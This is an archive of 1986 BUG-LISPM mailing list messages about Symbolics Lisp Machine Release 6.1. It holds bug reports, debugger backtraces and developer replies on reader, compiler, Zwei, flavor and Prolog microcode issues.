ZWEI:COM-MAIL-INTERNAL:  (P.C. = 40)
   Arg 0 (ZWEI:RE-INIT-P): T
   Arg 1 (ZWEI:INITIAL-DESTINATION): "BUG-LISPM@REAGAN"
   Arg 2 (ZWEI:INITIAL-BODY): "In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

"
   Arg 3 (ZWEI:INITIAL-INDEX): NIL
   Arg 4 (ZWEI:BUG-REPORT): T
   Arg 5 (ZWEI:SETUP-SUBJECT): (T :INIT :BUG)
   Arg 6 (ZWEI:INITIAL-SUBJECT): NIL

(:METHOD ZWEI:MAIL-TOP-LEVEL-EDITOR :MAIL):  (P.C. = 32)
   Arg 0 (SELF): #<MAIL-TOP-LEVEL-EDITOR 145657070>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:MAIL-TOP-LEVEL-EDITOR -- 2. IV's, 0. FL's 120415410>
   Arg 2 (SI:OPERATION): :MAIL
   Arg 3 (ZWEI:INITIAL-DESTINATION): "BUG-LISPM@REAGAN"
   Arg 4 (ZWEI:INITIAL-BODY): "In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

"
   Arg 5 (ZWEI:PROMPT): NIL
   Arg 6 (ZWEI:INITIAL-IDX): NIL
   Arg 7 (ZWEI:BUG-REPORT): T
   Arg 8 (ZWEI:MAKE-SUBJECT): (T :INIT :BUG)
   Arg 9 (ZWEI:INITIAL-SUBJECT): NIL

MAIL:  (P.C. = 40)
   Arg 0 (ZWEI:INITIAL-DESTINATION): "BUG-LISPM@REAGAN"
   Arg 1 (ZWEI:INITIAL-BODY): "In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.3, Macsyma 310.35, Experimental RELATUS 147.8,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

"
   Arg 2 (ZWEI:PROMPT): NIL
   Arg 3 (ZWEI:INITIAL-IDX): NIL
   Arg 4 (ZWEI:BUG-REPORT): T
   Arg 5 (ZWEI:MAKE-SUBJECT): (T :INIT :BUG)
   Arg 6 (ZWEI:INITIAL-SUBJECT): NIL

BUG:  (P.C. = 36)
   Arg 0 (ZWEI:SYSTEM): LISPM
   --Defaulted args:--
   Arg 1 (ZWEI:ADDITIONAL-BODY): NIL
   Arg 2 (ZWEI:PROMPT): NIL
   Arg 3 (ZWEI:POINT-BEFORE-ADDITIONAL-BODY): NIL
   Arg 4 (ZWEI:MAKE-SUBJECT): (T :INIT :BUG)
   Arg 5 (ZWEI:INITIAL-SUBJECT): NIL

(:PROPERTY COM-REPORT-BUG SI:CP-FUNCTION):  (P.C. = 14)  (from B:>relatus>utils>cpcoms)

COM-REPORT-BUG:  (P.C. = 5)  (from B:>relatus>utils>cpcoms)

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (COM-REPORT-BUG)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

TV:MOUSE-SENSITIVE-EVAL-FOR-LISP-COMMAND-LOOP:  (P.C. = 115)  (from RL: UTILS; WMAGIC)
   Arg 0 (TV:FORM): (COM-REPORT-BUG)

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 70640104>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 70640111>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Relatus Listener 1"
   Arg 1 (SI:ABORT-FUNCTION): TV:MOUSE-SENSITIVE-ABORT-FUNCTION-FOR-LISP-COMMAND-LOOP
   Arg 2 (SI:READ-FUNCTION): TV:RELATUS-LISTENER-CP-COMMAND-LOOP-READ-FUNCTION
   Arg 3 (SI:EVAL-FUNCTION): TV:MOUSE-SENSITIVE-EVAL-FOR-LISP-COMMAND-LOOP
   Arg 4 (SI:PRINT-FUNCTION): TV:MOUSE-SENSITIVE-PRINT-FOR-LISP-COMMAND-LOOP

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<RELATUS-LISTENER Relatus Listener 1 16501232 exposed>
   Rest arg: (:NAME "Relatus Listener 1" :ABORT-FUNCTION TV:MOUSE-SENSITIVE-ABORT-FUNCTION-FOR-LISP-COMMAND-LOOP :READ-FUNCTION TV:RELATUS-LISTENER-CP-COMMAND-LOOP-READ-FUNCTION :EVAL-FUNCTION TV:MOUSE-SENSITIVE-EVAL-FOR-LISP-COMMAND-LOOP :PRINT-FUNCTION TV:MOUSE-SENSITIVE-PRINT-FOR-LISP-COMMAND-LOOP)

TV:RELATUS-LISTENER-TOP-LEVEL1:  (P.C. = 31)  (from RL: UTILS; WMAGIC)
   Arg 0: #<RELATUS-LISTENER Relatus Listener 1 16501232 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
21-Feb-86 21:08:50-EST,3190;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 21:08-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 21 FEB 86  19:17:13 EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 23691; 21 Feb 86 19:09:25-EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 608; Fri 21-Feb-86 19:06:49-EST
Date: Fri, 21 Feb 86 19:13 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Typep should hack :KEYWORD
To: jcma@MIT-MC.ARPA, BUG-LISPM@MIT-REAGAN.ARPA
In-Reply-To: <860211100152.6.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860221191348.7.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Tue, 11 Feb 86 10:01 EST
    From: jcma@MIT-MC.ARPA

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 11.12, Experimental RELATUS 145.59, microcode TMC5-MIC 336,
    FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

(cl:typep :foo 'cl:keyword) works.  We aren't putting much effort into
ZL these days...

    >>Error: :KEYWORD is not a type known to TYPEP
    While in the function TYPEP  SI:*EVAL  (:INTERNAL SI:BREAK-INTERNAL 1)

    TYPEP:  (P.C. = 165)
       Arg 0 (SI:X): :FOO
       Arg 1 (SI:TYPE): :KEYWORD
       Local 2 (SI:DTP): 2
       Local 3 (SI:PRED): NIL
       Local 4 (SYMBOL): "~S is not a type known to TYPEP"

    SI:*EVAL:  (P.C. = 401)
       Arg 0 (SI:FORM): (TYPEP :FOO :KEYWORD)
       Local 0 (SI:FORM): NIL
       Arg 1 (SI:ENV): NIL
       --Defaulted args:--
       Arg 2 (SI:HOOK): NIL

    (:INTERNAL SI:BREAK-INTERNAL 1):  (P.C. = 4)
       Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): (NIL)
       Arg 1 (SI:FORM): (TYPEP :FOO :KEYWORD)

    (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
       Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 74640265>

    TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
       Arg 0 (TV:NEW-MODE): :BLAST
       Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
       Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 74640272>

    SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
       Arg 0 (SI:NAME): "Breakpoint ZMACS"
       Arg 1 (SI:ABORT-FUNCTION): SI:BREAK-HERALD
       Arg 2 (SI:READ-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 0) 54713201>
       Arg 3 (SI:EVAL-FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL SI:BREAK-INTERNAL 1) 54713203>
       --Defaulted args:--
       Arg 4 (SI:PRINT-FUNCTION): NIL

    SI:BREAK-INTERNAL:  (P.C. = 212)
       Arg 0 (SI:TAG): "ZMACS"
       Local 0 (SI:TAG): "Breakpoint ZMACS"
       Arg 1 (SI:CONDITIONAL): T
       --Defaulted args:--
       Arg 2: NIL

    COM-BREAK:  (P.C. = 65)

    Rest of stack:
    COMMAND-EXECUTE:  (P.C. = 57)
    PROCESS-COMMAND-CHAR:  (P.C. = 14)
    (:METHOD EDITOR :EDIT):  (P.C. = 233)
    (:METHOD TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
    ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)
    SI:PROCESS-TOP-LEVEL:  (P.C. = 54)


21-Feb-86 21:09:15-EST,1440;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 21:09-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 21 FEB 86  19:17:17 EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 23692; 21 Feb 86 19:10:44-EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 609; Fri 21-Feb-86 19:08:12-EST
Date: Fri, 21 Feb 86 19:15 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: ZWEI:INTERVAL-STREAM
To: jcma@MIT-MC.ARPA, BUG-LISPM@MIT-REAGAN.ARPA
In-Reply-To: <860212122242.4.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860221191512.8.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Wed, 12 Feb 86 12:22 EST
    From: jcma@MIT-MC.ARPA

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 11.12, Experimental RELATUS 145.59, microcode TMC5-MIC 336,
    FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

    Should support :STRING-SEARCH and :STRING-REVERSE-SEARCH.  That way people
    wouldn't have to implement it themselves all the time.

I'll, bite.  What does it do?  Does it return a BP, or does it position
the stream before the thing it found, or after?  If it doesn't find
anything, does it return you to where you were or stick you at EOF?

21-Feb-86 21:40:34-EST,1283;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 21 Feb 86 21:40-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 21 Feb 86 21:26:32 EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 611; Fri 21-Feb-86 19:20:39-EST
Date: Fri, 21 Feb 86 19:27 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: dtp-array is not in global; other trivial manual bug
To: David Chapman <Zvona@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860220133146.2.ZVONA@OTIS.AI.MIT.EDU>
Message-ID: <860221192739.0.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Thu, 20 Feb 86 13:31 EST
    From: David Chapman <Zvona@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
    FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
    FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

    dtp-array is in sys:, not global:.  Weird.  
All dtp-foobars should be in SYS:.  If there are any in GLOBAL: I will
claim that is a historical accident.
    Also, on p. 13 of vol 8,
    under sys:*data-types*, there is a colon missing in the body of the
    text.

22-Feb-86 11:37:14-EST,1336;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 22 Feb 86 11:37-EST
Received: from MIT-EMS.ARPA by MIT-ZERMATT.ARPA via INTERNET with SMTP id 25285; 22 Feb 86 11:38:28-EST
Received: by mit-ems.ARPA (4.12/4.8)  id AA11673; Sat, 22 Feb 86 11:40:39 est
Date: Sat, 22 Feb 86 11:40:39 est
From: Steven Haflich <smh@mit-ems.ARPA>
Message-Id: <8602221640.AA11673@mit-ems.ARPA>
To: BUG-LISPM@MIT-ZERMATT.ARPA, SLN@MIT-MC
Subject: Re:  Common Lisp Structure Printing and Reading Bugs

There is another #S-related reader bug in Release 6.1.  I discovered it
on a non-MIT non-Internet 6.1 3670, thus this is from memory:

	(defstruct foo a)
	;; The following both work:
	'#1=#s(foo a (0 #1#))
	'#1=(0 1 2 . #1#)
	;; The following causes the reader to blow up taking
	;; CDR (or maybe it was CAR ?) of a non-CONS.
	'#1=#s(foo a (0 . #1#))

It suspect the reader code that does pass 2 replacement of #n# values
inside structures has a NULL predicate where it really needs a CONSP.

By the way, although I shouldn't preempt Symbolics official response,
this incompatible difference is documented in the Release 6 manuals:

> From SLN%MIT-MC@EDDIE.MIT.EDU Fri Feb 21 16:00:03 1986
> 
> 1) The Common Lisp defstruct default printing for structures should be
> using #S syntax.  Instead, #< ...> is used.
22-Feb-86 19:01:53-EST,3336;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 22 Feb 86 19:01-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 22 Feb 86 19:00:24 EST
Received: from CUYAHOGA.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 423159; Sat 22-Feb-86 18:57:34-EST
Date: Sat, 22 Feb 86 19:00 EST
From: Robert A. Cassels <Cassels@TENEX.SCRC.Symbolics.COM>
Subject: Prolog & lispms without XSQ's
To: CJL@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860221144338.2.CJL@OTIS.AI.MIT.EDU>
Message-ID: <860222190016.4.CASSELS@CUYAHOGA.SCRC.Symbolics.COM>
Reply-To: Robert A. Cassels <Cassels@SCRC-STONY-BROOK.ARPA>

    Date: Fri, 21 Feb 86 14:43 EST
    From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 13.3, Macsyma 310.35, Prolog 12.1, microcode TMC5-IO4-COL-MIC 353,
    FEP 127, FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
    FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

    Is there a fundamental reason why there is no prolog microcode for
    machines that don't have XSQ's, or is it marketing ploy to sell
    hardware? Couldn't some other microcode feature have been removed to
    make room for prolog stuff? All of our machines have only one kind of
    disk, and most no tape drives on them at all. Couldn't some tape support
    be removed to make room for prolog support?

Recent microcode changes to support Common Lisp and improve overall Lisp
performance leave no room for Prolog, even after removing the (small)
amount of tape microcode.  As implementor of our Prolog, I'm heartened
that you'd be willing to sacrifice Lisp microcode features in order to
run Prolog.  Unfortunately Prolog needs to have the Lisp engine around.

    It seems pretty sad that an expensive hardware feature is required to
    run a particular language on a 3600. Suppose there isn't any more
    microcode room. How about some macrocode.

A macrocode implementation compatible with the microcode implementation
is not feasible, since our Prolog uses the stack and other parts of the
micro-machine in fundamentally different ways from Lisp.  [This was
suggested by our marketing staff a long time ago -- they're really not
such bad people as you implied above.]

					      I'd settle for a slow version
    of prolog than no version at all. Is Symbolics really willing to say,
    "Prolog doesn't run on all Symbolics lisp machines. It runs on a
    particular subset of lisp machines that have extended sequencers, which
    aren't standard and cost mucho kilobucks more."

When the 3600 was first designed, the control memory chips used in the
XSQ were not available.  The design for a high-performance Prolog engine
based on the 3600 architecture required a large amount of special
microcode.  It is indeed unfortunate that such engineering tradeoffs
leave our Prolog unavailable on many machines.

Note that XSQs are standard on our most-recently introduced models,
the 3645 and 3675.

    >>Trap: Illegal instruction 303777 (SYS:%PROLOG-EXECUTE).
    While in the function PL-COMPILER::EXECUTE-CLAUSE-INTERNAL  PL-COMPILER::EXECUTE-CLAUSE  PL-COMPILER::EXECUTE-QUERY

    PL-COMPILER::EXECUTE-CLAUSE-INTERNAL:  (P.C. = 20)

22-Feb-86 23:45:53-EST,2293;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 22 Feb 86 23:45-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 22 FEB 86  23:44:38 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23818; Sat 22-Feb-86 23:47:02-EST
Date: Sat, 22 Feb 86 23:46 EST
From: JCMA@MIT-AI.ARPA
Subject: ZWEI:INTERVAL-STREAM
To: DCP@SCRC-QUABBIN.ARPA
cc: BUG-LISPM@MIT-REAGAN.ARPA
In-Reply-To: <860221191512.8.DCP@NEPONSET.SCRC.Symbolics.COM>
Message-ID: <860222234605.7.JCMA@MIT-MORRISON.ARPA>

    Date: Fri, 21 Feb 86 19:15 EST
    From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>

	Date: Wed, 12 Feb 86 12:22 EST
	From: jcma@MIT-MC.ARPA

	In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
	AISite 11.12, Experimental RELATUS 145.59, microcode TMC5-MIC 336,
	FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
	FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

	Should support :STRING-SEARCH and :STRING-REVERSE-SEARCH.  That way people
	wouldn't have to implement it themselves all the time.

    I'll, bite.  What does it do?  Does it return a BP, or does it position
    the stream before the thing it found, or after?  If it doesn't find
    anything, does it return you to where you were or stick you at EOF?

Well, I would think an analogue to string searching through the buffer would
be one good interface.  In this model, it positions the stream after the thing
being searched for.  When it fails, it should return NIL and leave you where
you started. This suggests returning multiple values.  This could be more
useful if the notion of pointer into a stream we available, i.e. an analog to
the BP moving and cursor setting functions in zmacs.  Since people may also
want the BP abstraction, another version of search should work in terms of
them.  Either you go for two sets of messages or one set that returns multiple
values suited to the stream and BP abstractions. (I wonder if the BP view
isn't am abstraction violation.  It could certainly be useful and should be
available.)  Not very helpful I guess, but I am glad you are putting it in.  I
have several uses in mind.  Could I have a copy of the code when it
materializes?  Thanks.
23-Feb-86 03:57:59-EST,1669;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 03:57-EST
Received: from SCRC-STONY-BROOK.ARPA by MC.LCS.MIT.EDU 23 Feb 86 03:42:57 EST
Received: from SWALLOW.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 423287; Sun 23-Feb-86 03:03:39-EST
Date: Sun, 23 Feb 86 03:03 EST
From: Michael Greenwald <Greenwald@SCRC-STONY-BROOK.ARPA>
Subject: the compiler doesn't constant-fold
To: SWM@SCRC-QUABBIN.ARPA, Zvona@OZ.AI.MIT.EDU, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860220143656.7.SWM@THAMES.SCRC.Symbolics.COM>
Message-ID: <860223030345.2.GREENWALD@SWALLOW.SCRC.Symbolics.COM>

    Date: Thu, 20 Feb 86 14:36 EST
    From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>

	Date: Thu, 20 Feb 86 12:17 EST
	From: David Chapman <Zvona@OZ.AI.MIT.EDU>

	In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
	AISite 13.2, Macsyma 310.35, microcode TMC5-IO4-ST506-MIC 336, FEP 127,
	FEP0:>V127-LISP.FLOD(2), FEP0:>V127-LOADERS.FLOD(3),
	FEP0:>V127-INFO.FLOD(2), FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

	(defun foo (x)
	  (+ 0 x))

	(disasemble 'foo)
	  0  ENTRY: 1 REQUIRED, 0 OPTIONAL
	  1  PUSH-IMMED 0
	  2  BUILTIN +-INTERNAL STACK FP|0      ;X
	  3  RETURN-STACK 

	I wrote a macro that generated (+ 0 ...) a lot.  

	This optimization is pretty elementary...

    Optimizers are much more consistent in the development world.  This one
    works.

I don't know if it makes a difference, but (+ 0 'A) is different than
simply 'A.  It is probably incorrect for anyone to depend on (+ 0 'A)
raising an error, but just in case anyone cared, I thought I should
mention it.

23-Feb-86 04:34:40-EST,1438;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 04:34-EST
Received: from SCRC-STONY-BROOK.ARPA by MIT-ZERMATT.ARPA via INTERNET with SMTP id 25328; 23 Feb 86 04:34:07-EST
Received: from SWALLOW.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 423303; Sun 23-Feb-86 04:30:49-EST
Date: Sun, 23 Feb 86 04:30 EST
From: Michael Greenwald <Greenwald@SCRC-STONY-BROOK.ARPA>
Subject: Re:  Common Lisp Structure Printing and Reading Bugs
To: smh@MIT-EMS.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA, SLN@MIT-MC.ARPA
In-Reply-To: <8602221640.AA11673@mit-ems.ARPA>
Message-ID: <860223043052.3.GREENWALD@SWALLOW.SCRC.Symbolics.COM>

    Date: Sat, 22 Feb 86 11:40:39 est
    From: Steven Haflich <smh@mit-ems.ARPA>

    There is another #S-related reader bug in Release 6.1.  I discovered it
    on a non-MIT non-Internet 6.1 3670, thus this is from memory:

	    (defstruct foo a)
	    ;; The following both work:
	    '#1=#s(foo a (0 #1#))
	    '#1=(0 1 2 . #1#)
	    ;; The following causes the reader to blow up taking
	    ;; CDR (or maybe it was CAR ?) of a non-CONS.
	    '#1=#s(foo a (0 . #1#))

    It suspect the reader code that does pass 2 replacement of #n# values
    inside structures has a NULL predicate where it really needs a
    CONSP.

(Not really.)

In any case thanks - this was one I hadn't caught before.  This bug will
be fixed for the next release.

23-Feb-86 18:02:18-EST,921;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 17:10-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 23 FEB 86  17:10:39 EST
Received: from SCRC-STONY-BROOK.ARPA by MIT-REAGAN.ARPA via INTERNET with SMTP id 23880; 23 Feb 86 17:13:14-EST
Received: from NEPONSET.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 423522; Sun 23-Feb-86 17:06:07-EST
Date: Sun, 23 Feb 86 17:15 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: ZWEI:INTERVAL-STREAM
To: JCMA@MIT-AI.ARPA, DCP@SCRC-QUABBIN.ARPA
cc: BUG-LISPM@MIT-REAGAN.ARPA
In-Reply-To: <860222234605.7.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860223171538.7.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Sat, 22 Feb 86 23:46 EST
    From: JCMA@MIT-AI.ARPA

    Could I have a copy of the code when it
    materializes?  Thanks.

I don't do Zwei.  I do ask questions to refine ideas.

23-Feb-86 19:10:12-EST,496;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Feb 86 19:10-EST
Received: from SNOWBIRD.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 25356; Sun 23-Feb-86 19:10:30-EST
Date: Sun, 23 Feb 86 19:09 EST
From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>
Subject: DEFINE-CP-COMMAND
To: Bug-Lispm@MIT-ZERMATT.ARPA
Message-ID: <860223190945.1.CWH@SNOWBIRD.LCS.MIT.EDU>

Don't forget to make DEFINE-CP-COMMAND expand into CL:DEFUN so that we can use
RETURN-FROM.
24-Feb-86 08:53:31-EST,4275;000000000000
Received: from APIARY-7.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 24 Feb 86 08:53-EST
Date: Mon, 24 Feb 86 08:53 EST
From: Bonnie J. Dorr <Bonnie@MIT-PREP.ARPA>
Subject: Evaluating Vs Compiling Flavor Definitions
To: BUG-LISPM@OZ.AI.MIT.EDU
cc: TOMR@OZ.AI.MIT.EDU
Message-ID: <860224085346.3.BONNIE@APIARY-7.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 12.0, Experimental Apiary: The Actor Computing System 6.1,
Experimental Traveler: The Apiary Observatory 4.1,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Apiary-7:

It seems that once a file containing compiled flavors is loaded from disk,
evaluating the flavor removes the automatically generated methods.

>>Error: The object #<GRAMMAR 5162326> received a :RULES message, which went unclaimed.
         The rest of the message was ()
While in the function SEND  SI:*EVAL  SI:DIGESTED-LET

(:METHOD GRAMMAR :ADD-RULE):  (from PIG:USRD$:[BONNIE.LISP.MYEARLEY]DEFGRAM)
   Arg 0 (SELF): #<GRAMMAR 5162326>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): GRAMMAR
   Arg 2 (SI:OPERATION): :ADD-RULE
   Arg 3 (RULE)
   Extraneous Rest Arg: NIL
   Local 0: #<GRAMMAR 5162326>
   Local 1: GRAMMAR

(LAMBDA (RULE #:G0568) (SI:DIGESTED-PROG (PROG NIL SI:NEXT-LOOP # # ...) NIL NIL NIL ...)):
   Arg 0 (RULE): NIL
   Arg 1 (#:G0568): NIL
   --Extraneous args:--
   Arg 2: ((S ==> NP |.|) (NP ==> NP PP) (NP ==> N) (PP ==> P NP))

SI:*EVAL:  (P.C. = 160)
   Arg 0 (SI:FORM): (LOOP FOR RULE IN (QUOTE ((S ==> NP |.|) (NP ==> NP PP) (NP ==> N) (PP ==> P NP))) DO (UNLESS (MEMBER RULE *GRAMMAR :TEST (FUNCTION EQUAL)) (PUSH RULE *GRAMMAR)) (SEND SIMPLE-GRAMMAR-GENSYM :ADD-RULE RULE))
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

PROGN:  (P.C. = 13)
   Arg 0 (SI:.FORM.): (PROGN (WHEN (MEMBER (QUOTE SIMPLE-GRAMMAR-GENSYM) *GRAMMAR-NAMES) (LET (#) (LOOP FOR RULE IN OLD-RULES DO #))) (SETQ SIMPLE-GRAMMAR-GENSYM (MAKE-INSTANCE (QUOTE GRAMMAR))) (LOOP FOR RULE IN (QUOTE (# # # #)) DO (UNLESS (MEMBER RULE *GRAMMAR :TEST #) (PUSH RULE *GRAMMAR)) (SEND SIMPLE-GRAMMAR-GENSYM :ADD-RULE RULE)) (UNLESS (MEMBER (QUOTE SIMPLE-GRAMMAR-GENSYM) *GRAMMAR-NAMES) (PUSH (QUOTE SIMPLE-GRAMMAR-GENSYM) *GRAMMAR-NAMES)))
   Arg 1 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 163)
   Arg 0 (SI:FORM): (DEFGRAMMAR SIMPLE-GRAMMAR (S ==> NP |.|) (NP ==> NP PP) (NP ==> N) (PP ==> P NP))
